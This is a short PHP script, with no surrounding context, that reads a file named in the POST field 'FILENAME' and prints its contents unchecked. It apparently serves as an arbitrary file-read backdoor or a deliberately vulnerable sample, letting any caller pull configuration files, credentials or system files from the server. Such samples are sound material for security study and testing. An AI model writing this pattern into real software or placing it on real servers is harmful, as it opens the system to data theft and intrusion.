<?php
if(isset($_POST['FILENAME'])) {
    $filename= $_POST['FILENAME'];
    echo file_get_contents($filename);
}
?>